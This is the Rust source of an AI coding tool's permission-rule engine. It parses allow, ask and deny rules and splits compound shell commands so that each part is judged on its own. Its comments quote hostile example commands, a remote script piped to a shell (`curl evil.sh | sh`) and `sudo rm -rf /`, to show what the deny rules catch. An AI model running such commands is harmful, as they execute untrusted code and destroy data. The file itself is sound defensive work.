//! Per-command permission rules: `allow`, `ask` and `deny` lists of
//! `Tool` or `Tool(specifier)`, consulted for every call the toolbox runs.
//!
//! # Where they come from
//!
//! | layer    | file                                             | lists honoured      |
//! |----------|--------------------------------------------------|---------------------|
//! | managed  | [`super::managed::managed_path`] (`managed.toml`) | deny, ask, allow    |
//! | user     | `~/.incode/admin.json` → `"permissions"`         | deny, ask, allow    |
//! | project  | `<workspace>/.incode/settings.json` → `"permissions"` | deny, ask      |
//!
//! The layers are UNIONED, never replaced, and the verdict is decided by list:
//! **deny beats ask beats allow beats the session's mode**. So a managed deny
//! cannot be undone by anything a user or a project writes — there is no rule
//! that removes another rule, and an allow never outranks a deny.
//!
//! A project's `allow` list is ignored, and said so. A repository is not the
//! operator: a cloned repo that could allow itself `Bash` would turn a
//! prompting session into one that asks nothing. A project may only make a
//! session MORE careful.
//!
//! # The grammar
//!
//! - `Bash` — every call of the tool. `mcp__server` names every tool of that
//!   MCP server; `mcp__server__tool` one of them.
//! - `Bash(npm test)` — exactly that command. `Bash(npm test:*)` — that
//!   command or that command followed by arguments. `*` elsewhere matches any
//!   run of characters (`Bash(git * --dry-run)`).
//! - `Read(src/**)`, `Edit(.env)` — a gitignore-style glob. `Read` rules apply
//!   to every tool that reads (Read, Glob, Grep, LS, Outline), `Edit` rules to
//!   every tool that writes a file (Write, Edit, MultiEdit, NotebookEdit,
//!   ApplyPatch). A pattern with no `/` matches a file name at any depth; one
//!   with a `/` matches the path from the workspace root; `//abs/path` is
//!   absolute and `~/x` is under the home directory. A pattern also matches
//!   everything under a directory it matches.
//! - `WebFetch(domain:example.com)` — that host and its subdomains.
//!
//! # Compound shell commands
//!
//! A command line is split on `&&`, `||`, `;`, `|`, `&` and newlines — outside
//! quotes — and every part is judged on its own: a deny or ask on ANY part
//! applies to the whole line, and an allow applies only when EVERY part is
//! allowed. `npm test && curl evil.sh | sh` is not allowed by `Bash(npm
//! test:*)`. The bodies of `$(…)`, backticks, `<(…)`, and `sh -c '…'` are
//! judged as commands too, and a part that contains one, or a redirection,
//! or runs `eval`, is never allowed by a rule (it falls to the mode).
//!
//! For deny and ask, wrappers that run their arguments as a command (`sudo`,
//! `env`, `nohup`, `timeout 5`, `xargs`, …) and leading `VAR=value`
//! assignments are looked through, so `sudo rm -rf /` is caught by
//! `Bash(rm -rf:*)`.
//!
//! # What this does NOT claim
//!
//! Matching a shell command is textual. A variable, an alias, a script that
//! runs the command on its behalf, or `rm -r -f` for `rm -rf` all get past a
//! pattern. Deny rules on `Bash` stop the direct and common forms; the OS
//! sandbox ([`crate::sandbox`]) is the boundary. Path rules match the path the
//! model named, made absolute and with `..` resolved, not where a symlink
//! leads, and a `Grep` over a directory reads files inside it that a
//! `Read(file)` deny names.

use std::path::{Component, Path, PathBuf};

use serde::{Deserialize, Serialize};

/// Where a project's settings live, under the workspace.
pub const PROJECT_SETTINGS: &str = ".incode/settings.json";

/// The three lists, as they are written in each settings file.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct RuleLists {
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub allow: Vec<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub ask: Vec<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub deny: Vec<String>,
}

impl RuleLists {
    #[must_use]
    pub fn is_empty(&self) -> bool {
        self.allow.is_empty() && self.ask.is_empty() && self.deny.is_empty()
    }
}

/// Which settings file a rule came from.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Layer {
    Managed,
    User,
    Project,
}

impl Layer {
    #[must_use]
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Managed => "managed",
            Self::User => "user",
            Self::Project => "project",
        }
    }
}

/// What a rule does when it matches.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Effect {
    Deny,
    Ask,
    Allow,
}

impl Effect {
    #[must_use]
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Deny => "deny",
            Self::Ask => "ask",
            Self::Allow => "allow",
        }
    }
}

/// What a call is about, as the toolbox extracts it from the call's input.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Subject {
    /// A shell command line.
    Command(String),
    /// The files the call names, as the model named them.
    Paths(Vec<String>),
    /// An address the call fetches.
    Url(String),
    /// Nothing a specifier could match.
    None,
}

/// Where relative paths are resolved, and what `~` is.
#[derive(Debug, Clone)]
pub struct PathContext {
    pub workspace: PathBuf,
    pub home: Option<PathBuf>,
}

/// The rule that decided a call.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Verdict {
    pub effect: Effect,
    pub rule: String,
    pub layer: Layer,
}

impl Verdict {
    /// `deny rule \`Bash(rm:*)\` (managed)`, for a refusal or a question.
    #[must_use]
    pub fn describe(&self) -> String {
        format!(
            "{} rule `{}` ({} settings)",
            self.effect.as_str(),
            self.rule,
            self.layer.as_str()
        )
    }
}

// ---------------------------------------------------------------------------
// One rule
// ---------------------------------------------------------------------------

/// One parsed rule.
#[derive(Debug, Clone)]
pub struct Rule {
    /// As written.
    pub text: String,
    tool: String,
    spec: Spec,
}

#[derive(Debug, Clone)]
enum Spec {
    /// Every call of the tool.
    Any,
    /// A shell command pattern.
    Command(CommandPattern),
    /// A path glob.
    Path(PathPattern),
    /// `domain:<host>`.
    Domain(String),
}

/// The tools a `Read(...)` rule covers.
const READ_FAMILY: [&str; 5] = ["Read", "Glob", "Grep", "LS", "Outline"];
/// The tools an `Edit(...)` rule covers.
const EDIT_FAMILY: [&str; 5] = ["Write", "Edit", "MultiEdit", "NotebookEdit", "ApplyPatch"];

impl Rule {
    /// Parse `Tool` or `Tool(specifier)`. `home` expands a `~/` path.
    ///
    /// # Errors
    ///
    /// The rule is not of that shape, or its pattern does not compile.
    pub fn parse(text: &str, home: Option<&Path>) -> Result<Self, String> {
        let trimmed = text.trim();
        let (tool, inner) = match trimmed.find('(') {
            Some(open) => {
                let Some(body) = trimmed[open + 1..].strip_suffix(')') else {
                    return Err(format!("rule `{text}` opens `(` and does not end with `)`"));
                };
                (trimmed[..open].trim(), Some(body.trim()))
            }
            None => (trimmed, None),
        };
        if tool.is_empty()
            || !tool
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-' || c == '*')
        {
            return Err(format!("rule `{text}` does not start with a tool name"));
        }
        let spec = match inner {
            None | Some("" | "*" | ":*") => Spec::Any,
            Some(body) if tool == "Bash" => Spec::Command(CommandPattern::parse(body)?),
            Some(body) if is_path_tool(tool) => Spec::Path(PathPattern::parse(body, home)?),
            Some(body) => match body.strip_prefix("domain:") {
                Some(host) if !host.trim().is_empty() => {
                    Spec::Domain(host.trim().to_ascii_lowercase())
                }
                // Said, rather than kept as a rule that never matches: a deny
                // nobody notices is not applied is worse than none.
                _ => {
                    return Err(format!(
                        "rule `{text}`: `{tool}` takes no specifier incode understands (Bash \
                         takes a command, file tools a path, WebFetch `domain:<host>`); \
                         write `{tool}` for every call"
                    ))
                }
            },
        };
        Ok(Self {
            text: trimmed.to_string(),
            tool: tool.to_string(),
            spec,
        })
    }

    /// Whether this rule names `tool` at all.
    fn names(&self, tool: &str) -> bool {
        let rule = self.tool.as_str();
        if rule == "*" || rule == tool {
            return true;
        }
        if let Some(prefix) = rule.strip_suffix('*') {
            return tool.starts_with(prefix);
        }
        // `mcp__server` covers each of that server's tools.
        if rule.starts_with("mcp__") && rule.matches("__").count() == 1 {
            return tool
                .strip_prefix(rule)
                .is_some_and(|rest| rest.starts_with("__"));
        }
        (rule == "Read" && READ_FAMILY.contains(&tool))
            || (rule == "Edit" && EDIT_FAMILY.contains(&tool))
    }
}

fn is_path_tool(tool: &str) -> bool {
    READ_FAMILY.contains(&tool) || EDIT_FAMILY.contains(&tool)
}

// ---------------------------------------------------------------------------
// Shell commands
// ---------------------------------------------------------------------------

/// A pattern over one simple command, whitespace-normalised.
#[derive(Debug, Clone)]
struct CommandPattern {
    regex: regex::Regex,
}

impl CommandPattern {
    fn parse(body: &str) -> Result<Self, String> {
        let (body, prefix) = match body.strip_suffix(":*") {
            Some(head) => (head, true),
            None => (body, false),
        };
        let normal = collapse_whitespace(body);
        if normal.is_empty() {
            return Err("an empty command pattern".to_string());
        }
        let mut source = String::from("^");
        for (i, piece) in normal.split('*').enumerate() {
            if i > 0 {
                source.push_str(".*");
            }
            source.push_str(&regex::escape(piece));
        }
        if prefix {
            // The command itself, or it followed by arguments — never a
            // longer word: `npm test:*` does not match `npm testify`.
            source.push_str("(?: .*)?");
        }
        source.push('$');
        let regex = regex::Regex::new(&source).map_err(|e| e.to_string())?;
        Ok(Self { regex })
    }

    fn matches(&self, command: &str) -> bool {
        self.regex.is_match(command)
    }
}

fn collapse_whitespace(text: &str) -> String {
    text.split_whitespace().collect::<Vec<_>>().join(" ")
}

/// One simple command of a command line, ready to be matched.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Segment {
    /// As written, whitespace-collapsed. What an allow rule is matched with.
    pub text: String,
    /// The forms a deny or ask rule is matched with: `text`, and `text` with
    /// leading assignments and wrapper commands peeled off, one at a time.
    pub peeled: Vec<String>,
    /// A part no allow rule may pass: it substitutes a command, redirects,
    /// or hands a string to a shell.
    pub opaque: bool,
}

/// Split a command line into its simple commands, quote-aware.
///
/// Substituted commands (`$(…)`, backticks, `<(…)`, `>(…)`) are returned as
/// segments of their own, after the one they appear in, which is marked
/// opaque. So is the string handed to `sh -c` / `bash -c` / `eval`.
#[must_use]
pub fn split_command(line: &str) -> Vec<Segment> {
    let mut out = Vec::new();
    split_into(line, &mut out, 0);
    out
}

/// How deep `sh -c "sh -c '…'"` is followed before the rest is simply opaque.
const MAX_DEPTH: usize = 8;

fn split_into(line: &str, out: &mut Vec<Segment>, depth: usize) {
    if depth > MAX_DEPTH {
        out.push(Segment {
            text: collapse_whitespace(line),
            peeled: vec![collapse_whitespace(line)],
            opaque: true,
        });
        return;
    }
    let chars: Vec<char> = line.chars().collect();
    let mut i = 0;
    // The current part, as written; and with quoted text blanked, to look
    // for redirections outside quotes.
    let mut raw = String::new();
    let mut bare = String::new();
    let mut opaque = false;
    let mut inner: Vec<String> = Vec::new();
    let mut quote: Option<char> = None;

    let flush = |raw: &mut String,
                 bare: &mut String,
                 opaque: &mut bool,
                 inner: &mut Vec<String>,
                 out: &mut Vec<Segment>| {
        finish_segment(raw, bare, *opaque, out, depth);
        for body in inner.drain(..) {
            split_into(&body, out, depth + 1);
        }
        raw.clear();
        bare.clear();
        *opaque = false;
    };

    while i < chars.len() {
        let c = chars[i];
        let next = chars.get(i + 1).copied();
        match quote {
            Some('\'') => {
                raw.push(c);
                bare.push('_');
                if c == '\'' {
                    quote = None;
                }
                i += 1;
                continue;
            }
            Some('"') => {
                if c == '\\' {
                    raw.push(c);
                    if let Some(n) = next {
                        raw.push(n);
                    }
                    bare.push_str("__");
                    i += 2;
                    continue;
                }
                if c == '"' {
                    quote = None;
                    raw.push(c);
                    bare.push('_');
                    i += 1;
                    continue;
                }
                // Substitution happens inside double quotes too.
                if (c == '$' && next == Some('(')) || c == '`' {
                    let (body, end) = substitution(&chars, i);
                    raw.extend(&chars[i..end]);
                    bare.push('_');
                    inner.push(body);
                    opaque = true;
                    i = end;
                    continue;
                }
                raw.push(c);
                bare.push('_');
                i += 1;
                continue;
            }
            _ => {}
        }
        match c {
            '\\' => {
                raw.push(c);
                if let Some(n) = next {
                    raw.push(n);
                }
                bare.push_str("__");
                i += 2;
            }
            '\'' | '"' => {
                quote = Some(c);
                raw.push(c);
                bare.push('_');
                i += 1;
            }
            '$' if next == Some('(') => {
                let (body, end) = substitution(&chars, i);
                raw.extend(&chars[i..end]);
                bare.push('_');
                inner.push(body);
                opaque = true;
                i = end;
            }
            '`' => {
                let (body, end) = substitution(&chars, i);
                raw.extend(&chars[i..end]);
                bare.push('_');
                inner.push(body);
                opaque = true;
                i = end;
            }
            '<' | '>' if next == Some('(') => {
                let (body, end) = substitution(&chars, i + 1);
                raw.extend(&chars[i..end]);
                bare.push('_');
                inner.push(body);
                opaque = true;
                i = end;
            }
            ';' | '\n' | '\r' => {
                flush(&mut raw, &mut bare, &mut opaque, &mut inner, out);
                i += 1;
                // `;;` in a case arm: still a separator.
            }
            '|' => {
                flush(&mut raw, &mut bare, &mut opaque, &mut inner, out);
                // `||` and `|&` are one operator.
                i += if matches!(next, Some('|' | '&')) {
                    2
                } else {
                    1
                };
            }
            '&' => {
                // `>&2`, `2>&1`, `&>file`: a redirection, not a separator.
                let after_redirect = bare.ends_with('>') || bare.ends_with('<');
                if after_redirect || next == Some('>') {
                    raw.push(c);
                    bare.push(c);
                    i += 1;
                } else {
                    flush(&mut raw, &mut bare, &mut opaque, &mut inner, out);
                    i += if next == Some('&') { 2 } else { 1 };
                }
            }
            _ => {
                raw.push(c);
                bare.push(c);
                i += 1;
            }
        }
    }
    flush(&mut raw, &mut bare, &mut opaque, &mut inner, out);
}

/// The body of the substitution that starts at `start` (`$(`, `(` or a
/// backtick), and the index just past its end. Unterminated: the rest.
fn substitution(chars: &[char], start: usize) -> (String, usize) {
    if chars[start] == '`' {
        let mut i = start + 1;
        let mut body = String::new();
        while i < chars.len() && chars[i] != '`' {
            if chars[i] == '\\' && i + 1 < chars.len() {
                body.push(chars[i + 1]);
                i += 2;
                continue;
            }
            body.push(chars[i]);
            i += 1;
        }
        return (body, (i + 1).min(chars.len()));
    }
    // `$(` or `(`: find the matching close, quote-aware.
    let open = if chars[start] == '$' {
        start + 1
    } else {
        start
    };
    let mut depth = 0usize;
    let mut quote: Option<char> = None;
    let mut i = open;
    while i < chars.len() {
        let c = chars[i];
        match quote {
            Some(q) => {
                if c == '\\' && q == '"' {
                    i += 2;
                    continue;
                }
                if c == q {
                    quote = None;
                }
            }
            None => match c {
                '\\' => {
                    i += 2;
                    continue;
                }
                '\'' | '"' => quote = Some(c),
                '(' => depth += 1,
                ')' => {
                    depth -= 1;
                    if depth == 0 {
                        let body: String = chars[open + 1..i].iter().collect();
                        return (body, i + 1);
                    }
                }
                _ => {}
            },
        }
        i += 1;
    }
    let body: String = chars[(open + 1).min(chars.len())..].iter().collect();
    (body, chars.len())
}

/// Redirections that only point output at the terminal's other stream or at
/// nothing: harmless, and too common to make every command opaque.
fn benign_redirections() -> &'static regex::Regex {
    static RE: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
    RE.get_or_init(|| {
        regex::Regex::new(r"(?:\d*>>?|&>>?)\s*/dev/null\b|\d*>&\s*\d+|\d*<&\s*\d+")
            .expect("static regex")
    })
}

fn finish_segment(raw: &str, bare: &str, opaque: bool, out: &mut Vec<Segment>, depth: usize) {
    // A subshell or a group's brackets, and a leading `!`, do not change
    // which command runs.
    let mut text = collapse_whitespace(raw);
    loop {
        let before = text.len();
        for open in ["(", "{ ", "! "] {
            if let Some(rest) = text.strip_prefix(open) {
                text = rest.trim_start().to_string();
            }
        }
        // Only a close with no open of its own in this part: `$(c)` keeps
        // its bracket, the end of `(a; b)` loses it.
        for (open, close) in [('(', ")"), ('{', " }"), ('{', "}")] {
            let unbalanced = text.matches(close.trim()).count() > text.matches(open).count();
            if unbalanced {
                if let Some(rest) = text.strip_suffix(close) {
                    text = rest.trim_end().to_string();
                }
            }
        }
        if text.len() == before {
            break;
        }
    }
    // Shell keywords that introduce the command after them.
    for keyword in ["then ", "do ", "else ", "elif ", "if ", "while ", "until "] {
        if let Some(rest) = text.strip_prefix(keyword) {
            text = rest.trim_start().to_string();
        }
    }
    if text.is_empty() || matches!(text.as_str(), "fi" | "done" | "esac" | "then" | "do") {
        return;
    }
    let cleaned = benign_redirections().replace_all(bare, "");
    let redirects = cleaned.contains('>') || cleaned.contains('<');
    let (peeled, hands_to_shell) = peel(&text);
    let mut segment = Segment {
        text: text.clone(),
        peeled,
        opaque: opaque || redirects || hands_to_shell.is_some(),
    };
    segment.peeled.dedup();
    out.push(segment);
    if let Some(script) = hands_to_shell {
        split_into(&script, out, depth + 1);
    }
}

/// Split one simple command into words, quote-aware, with the quotes kept.
fn words(text: &str) -> Vec<String> {
    let mut words = Vec::new();
    let mut word = String::new();
    let mut quote: Option<char> = None;
    let mut chars = text.chars().peekable();
    while let Some(c) = chars.next() {
        match quote {
            Some(q) => {
                word.push(c);
                if c == '\\' && q == '"' {
                    if let Some(n) = chars.next() {
                        word.push(n);
                    }
                } else if c == q {
                    quote = None;
                }
            }
            None => match c {
                ' ' | '\t' => {
                    if !word.is_empty() {
                        words.push(std::mem::take(&mut word));
                    }
                }
                '\'' | '"' => {
                    quote = Some(c);
                    word.push(c);
                }
                '\\' => {
                    word.push(c);
                    if let Some(n) = chars.next() {
                        word.push(n);
                    }
                }
                _ => word.push(c),
            },
        }
    }
    if !word.is_empty() {
        words.push(word);
    }
    words
}

/// A word with its outer quotes and backslashes removed.
fn unquote(word: &str) -> String {
    let mut out = String::new();
    let mut quote: Option<char> = None;
    let mut chars = word.chars();
    while let Some(c) = chars.next() {
        match (quote, c) {
            (None, '\'' | '"') => quote = Some(c),
            (Some(q), _) if c == q => quote = None,
            (None | Some('"'), '\\') => {
                if let Some(n) = chars.next() {
                    out.push(n);
                }
            }
            _ => out.push(c),
        }
    }
    out
}

fn is_assignment(word: &str) -> bool {
    let Some(eq) = word.find('=') else {
        return false;
    };
    let name = &word[..eq];
    !name.is_empty()
        && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
        && !name.starts_with(|c: char| c.is_ascii_digit())
}

/// Commands that run the rest of their arguments as a command, and how many
/// leading non-flag arguments of their own to skip first.
fn wrapper(word: &str) -> Option<usize> {
    let name = word.rsplit('/').next().unwrap_or(word);
    match name {
        "sudo" | "doas" | "env" | "nohup" | "time" | "command" | "builtin" | "exec" | "nice"
        | "ionice" | "xargs" | "stdbuf" | "setsid" | "chroot" | "unbuffer" | "caffeinate" => {
            Some(usize::from(name == "chroot"))
        }
        "timeout" => Some(1),
        _ => None,
    }
}

/// Flags of `sudo` that take a value as the next word.
fn flag_takes_value(wrapper: &str, flag: &str) -> bool {
    matches!(
        (wrapper, flag),
        (
            "sudo",
            "-u" | "-g" | "-C" | "-h" | "-p" | "-U" | "-r" | "-t"
        ) | ("doas", "-u" | "-C")
            | ("nice", "-n")
            | ("timeout", "-s" | "-k" | "--signal" | "--kill-after")
            | ("xargs", "-I" | "-n" | "-P" | "-L" | "-d" | "-E" | "-s")
            | ("env", "-u" | "-C" | "-S")
            | ("stdbuf", "-i" | "-o" | "-e")
    )
}

/// `text`, then `text` with each leading assignment and wrapper peeled off in
/// turn; and the script, when the command hands one to a shell.
fn peel(text: &str) -> (Vec<String>, Option<String>) {
    let all = words(text);
    let mut forms = vec![all.join(" ")];
    let mut at = 0;
    while at < all.len() {
        let word = &all[at];
        if is_assignment(word) {
            at += 1;
        } else if let Some(skip) = wrapper(&unquote(word)) {
            let name = unquote(word);
            let name = name.rsplit('/').next().unwrap_or(&name).to_string();
            at += 1;
            while at < all.len() && (all[at].starts_with('-') || is_assignment(&all[at])) {
                let flag = all[at].clone();
                at += 1;
                if flag_takes_value(&name, &flag) {
                    at += 1;
                }
            }
            at += skip;
        } else {
            break;
        }
        if at < all.len() {
            forms.push(all[at..].join(" "));
        }
    }
    // `sh -c '<script>'`, `bash -lc "<script>"`, `eval <words>`.
    let rest = &all[at.min(all.len())..];
    let script = match rest.first().map(|w| unquote(w)) {
        Some(shell)
            if matches!(
                shell.rsplit('/').next().unwrap_or(&shell),
                "sh" | "bash" | "zsh" | "dash" | "ksh" | "fish"
            ) =>
        {
            rest.iter()
                .position(|w| w.starts_with('-') && !w.starts_with("--") && w.contains('c'))
                .and_then(|flag| rest.get(flag + 1))
                .map(|script| unquote(script))
        }
        Some(eval) if eval == "eval" => Some(
            rest[1..]
                .iter()
                .map(|w| unquote(w))
                .collect::<Vec<_>>()
                .join(" "),
        ),
        _ => None,
    };
    (forms, script)
}

// ---------------------------------------------------------------------------
// Paths
// ---------------------------------------------------------------------------

#[derive(Debug, Clone)]
struct PathPattern {
    matcher: globset::GlobMatcher,
    anchor: Anchor,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Anchor {
    /// No `/`: a file name, at any depth, anywhere.
    Name,
    /// From the workspace root.
    Workspace,
    /// An absolute path.
    Absolute,
}

impl PathPattern {
    fn parse(body: &str, home: Option<&Path>) -> Result<Self, String> {
        let mut pattern = body.replace('\\', "/");
        let anchor = if let Some(rest) = pattern.strip_prefix("~/") {
            let home = home.ok_or_else(|| format!("`{body}`: no home directory to expand"))?;
            pattern = format!(
                "{}/{rest}",
                home.to_string_lossy()
                    .replace('\\', "/")
                    .trim_end_matches('/')
            );
            Anchor::Absolute
        } else if let Some(rest) = pattern.strip_prefix("//") {
            pattern = format!("/{rest}");
            Anchor::Absolute
        } else if is_windows_absolute(&pattern) {
            Anchor::Absolute
        } else {
            // `/x` and `./x` are anchored at the workspace root; so is any
            // pattern with a `/` inside it.
            let rooted = pattern.starts_with('/') || pattern.starts_with("./");
            let rest = pattern
                .trim_start_matches("./")
                .trim_start_matches('/')
                .to_string();
            pattern = rest;
            if rooted || pattern.trim_end_matches('/').contains('/') {
                Anchor::Workspace
            } else {
                // A name: what is inside a directory of that name is matched
                // through its parents, so the trailing `/` adds nothing.
                pattern = pattern.trim_end_matches('/').to_string();
                Anchor::Name
            }
        };
        if pattern.ends_with('/') {
            pattern.push_str("**");
        }
        if pattern.is_empty() {
            return Err("an empty path pattern".to_string());
        }
        let glob = globset::GlobBuilder::new(&pattern)
            .literal_separator(true)
            .case_insensitive(cfg!(any(windows, target_os = "macos")))
            .build()
            .map_err(|e| format!("`{body}` is not a valid path pattern: {e}"))?;
        Ok(Self {
            matcher: glob.compile_matcher(),
            anchor,
        })
    }

    /// Whether `path`, or a directory it is in, matches.
    fn matches(&self, path: &str, ctx: &PathContext) -> bool {
        let absolute = normalise(&ctx.workspace, path);
        let workspace = normalise(&ctx.workspace, "");
        let mut current: Option<&Path> = Some(&absolute);
        while let Some(at) = current {
            let hit = match self.anchor {
                Anchor::Name => at
                    .file_name()
                    .is_some_and(|name| self.matcher.is_match(Path::new(name))),
                Anchor::Workspace => at
                    .strip_prefix(&workspace)
                    .ok()
                    .filter(|rel| !rel.as_os_str().is_empty())
                    .is_some_and(|rel| self.matcher.is_match(slashed(rel))),
                Anchor::Absolute => self.matcher.is_match(slashed(at)),
            };
            if hit {
                return true;
            }
            current = at.parent();
        }
        false
    }
}

fn is_windows_absolute(pattern: &str) -> bool {
    let bytes = pattern.as_bytes();
    bytes.len() >= 3 && bytes[0].is_ascii_alphabetic() && bytes[1] == b':' && bytes[2] == b'/'
}

fn slashed(path: &Path) -> PathBuf {
    PathBuf::from(path.to_string_lossy().replace('\\', "/"))
}

/// `path` made absolute against `base`, with `.` and `..` resolved by text.
#[must_use]
pub fn normalise(base: &Path, path: &str) -> PathBuf {
    let joined = if path.is_empty() {
        base.to_path_buf()
    } else if Path::new(path).is_absolute() {
        PathBuf::from(path)
    } else {
        base.join(path)
    };
    let mut out = PathBuf::new();
    for part in joined.components() {
        match part {
            Component::CurDir => {}
            Component::ParentDir => {
                out.pop();
            }
            other => out.push(other.as_os_str()),
        }
    }
    out
}

// ---------------------------------------------------------------------------
// The rule set
// ---------------------------------------------------------------------------

#[derive(Debug, Clone)]
struct Sourced {
    rule: Rule,
    layer: Layer,
}

/// Every rule in force for one workspace, by list.
#[derive(Debug, Clone, Default)]
pub struct PermissionRules {
    deny: Vec<Sourced>,
    ask: Vec<Sourced>,
    allow: Vec<Sourced>,
    /// Rules that did not parse, and lists that were ignored, said once.
    warnings: Vec<String>,
}

impl PermissionRules {
    /// No rules: every call goes to the mode.
    #[must_use]
    pub fn none() -> Self {
        Self::default()
    }

    /// The rules for `workspace`: managed, the user's, and the project's.
    ///
    /// Under `cfg(test)` only the project's: a test must not read the
    /// machine's managed file or the developer's own settings.
    #[must_use]
    pub fn load(workspace: &Path) -> Self {
        let home = crate::admin::home_dir();
        let mut rules = Self::default();
        #[cfg(not(test))]
        {
            match super::managed::load() {
                super::managed::Managed::Absent => {}
                super::managed::Managed::Loaded(settings) => {
                    rules.add(&settings.permissions, Layer::Managed, home.as_deref());
                }
                super::managed::Managed::Broken(why) => rules.deny_everything(&why),
            }
            let data_dir = crate::admin::AdminConfig::default_dir();
            match crate::admin::AdminConfig::load(&data_dir) {
                Ok(admin) => rules.add(&admin.permissions, Layer::User, home.as_deref()),
                Err(why) => rules.warnings.push(why),
            }
        }
        match read_project(workspace) {
            Ok(Some(lists)) => rules.add(&lists, Layer::Project, home.as_deref()),
            Ok(None) => {}
            Err(why) => rules.warnings.push(why),
        }
        rules
    }

    /// Add one layer's lists. A project's `allow` is refused, and said so.
    pub fn add(&mut self, lists: &RuleLists, layer: Layer, home: Option<&Path>) {
        let mut take = |texts: &[String], into: Effect| {
            for text in texts {
                match Rule::parse(text, home) {
                    Ok(rule) => {
                        let sourced = Sourced { rule, layer };
                        match into {
                            Effect::Deny => self.deny.push(sourced),
                            Effect::Ask => self.ask.push(sourced),
                            Effect::Allow => self.allow.push(sourced),
                        }
                    }
                    Err(why) => self
                        .warnings
                        .push(format!("{} settings: {why}; ignored", layer.as_str())),
                }
            }
        };
        take(&lists.deny, Effect::Deny);
        take(&lists.ask, Effect::Ask);
        if layer == Layer::Project && !lists.allow.is_empty() {
            self.warnings.push(format!(
                "{PROJECT_SETTINGS}: `allow` rules are ignored — a repository may only make \
                 a session more careful, never less; put allow rules in ~/.incode/admin.json"
            ));
        } else {
            take(&lists.allow, Effect::Allow);
        }
    }

    /// The managed file exists and could not be read: fail closed.
    fn deny_everything(&mut self, why: &str) {
        self.warnings.push(format!(
            "the managed settings could not be read ({why}); every tool call is refused until \
             they are fixed"
        ));
        if let Ok(rule) = Rule::parse("*", None) {
            self.deny.push(Sourced {
                rule,
                layer: Layer::Managed,
            });
        }
    }

    #[must_use]
    pub fn is_empty(&self) -> bool {
        self.deny.is_empty() && self.ask.is_empty() && self.allow.is_empty()
    }

    /// What was ignored, and why.
    #[must_use]
    pub fn warnings(&self) -> &[String] {
        &self.warnings
    }

    /// The rule that decides this call, if any: deny, then ask, then allow.
    #[must_use]
    pub fn decide(&self, tool: &str, subject: &Subject, ctx: &PathContext) -> Option<Verdict> {
        if self.is_empty() {
            return None;
        }
        let segments = match subject {
            Subject::Command(line) => split_command(line),
            _ => Vec::new(),
        };
        let verdict = |found: &Sourced, effect: Effect| Verdict {
            effect,
            rule: found.rule.text.clone(),
            layer: found.layer,
        };
        for (list, effect) in [(&self.deny, Effect::Deny), (&self.ask, Effect::Ask)] {
            if let Some(found) = list
                .iter()
                .find(|s| restricts(&s.rule, tool, subject, &segments, ctx))
            {
                return Some(verdict(found, effect));
            }
        }
        permits(&self.allow, tool, subject, &segments, ctx)
            .map(|found| verdict(found, Effect::Allow))
    }

    /// Every rule, a line each, for `/permissions`.
    #[must_use]
    pub fn describe(&self) -> Vec<String> {
        let mut lines = Vec::new();
        for (list, effect) in [
            (&self.deny, Effect::Deny),
            (&self.ask, Effect::Ask),
            (&self.allow, Effect::Allow),
        ] {
            for sourced in list {
                lines.push(format!(
                    "{:<5}  {:<40}  ({})",
                    effect.as_str(),
                    sourced.rule.text,
                    sourced.layer.as_str()
                ));
            }
        }
        lines
    }
}

// ---------------------------------------------------------------------------
// A turn's own allowlist
// ---------------------------------------------------------------------------

/// The tools ONE turn may use, as a custom command's `allowed-tools` names
/// them: the same grammar as an `allow` rule, judged the way an `allow` list
/// is — a command line only when EVERY part is covered and none is opaque,
/// several paths only when every one is.
///
/// It only narrows. A call it lets through still meets the deny and ask
/// rules, the guards, the mode and the hooks; being listed here is not an
/// `allow` rule and does not skip the `prompt` mode's question.
#[derive(Debug, Clone)]
pub struct Allowlist {
    allow: Vec<Sourced>,
    /// As written, for the refusal the model reads.
    listed: Vec<String>,
}

impl Allowlist {
    /// The rules in `texts`, and a line for each one that did not parse. A
    /// rule that does not parse is left out — which allows LESS, never more.
    #[must_use]
    pub fn parse(texts: &[String], home: Option<&Path>) -> (Self, Vec<String>) {
        let mut allow = Vec::new();
        let mut warnings = Vec::new();
        for text in texts {
            match Rule::parse(text, home) {
                Ok(rule) => allow.push(Sourced {
                    rule,
                    layer: Layer::User,
                }),
                Err(why) => warnings.push(format!("allowed-tools: {why}; left out")),
            }
        }
        let listed = texts.iter().map(|t| t.trim().to_string()).collect();
        (Self { allow, listed }, warnings)
    }

    /// Whether this call is one the list covers.
    #[must_use]
    pub fn permits(&self, tool: &str, subject: &Subject, ctx: &PathContext) -> bool {
        let segments = match subject {
            Subject::Command(line) => split_command(line),
            _ => Vec::new(),
        };
        permits(&self.allow, tool, subject, &segments, ctx).is_some()
    }

    /// The rules as written, parsed or not.
    #[must_use]
    pub fn listed(&self) -> &[String] {
        &self.listed
    }
}

/// Whether a deny or ask rule applies: to ANY part of the call.
fn restricts(
    rule: &Rule,
    tool: &str,
    subject: &Subject,
    segments: &[Segment],
    ctx: &PathContext,
) -> bool {
    if !rule.names(tool) {
        return false;
    }
    match (&rule.spec, subject) {
        (Spec::Any, _) => true,
        (Spec::Command(pattern), Subject::Command(_)) => segments
            .iter()
            .any(|s| s.peeled.iter().any(|form| pattern.matches(form))),
        (Spec::Path(pattern), Subject::Paths(paths)) => {
            paths.iter().any(|path| pattern.matches(path, ctx))
        }
        (Spec::Domain(domain), Subject::Url(url)) => host_matches(url, domain),
        _ => false,
    }
}

/// The allow rule that covers this call, if one does: for a command line,
/// EVERY part must be covered (by some rule each) and none may be opaque; for
/// several paths, every path.
fn permits<'a>(
    allow: &'a [Sourced],
    tool: &str,
    subject: &Subject,
    segments: &[Segment],
    ctx: &PathContext,
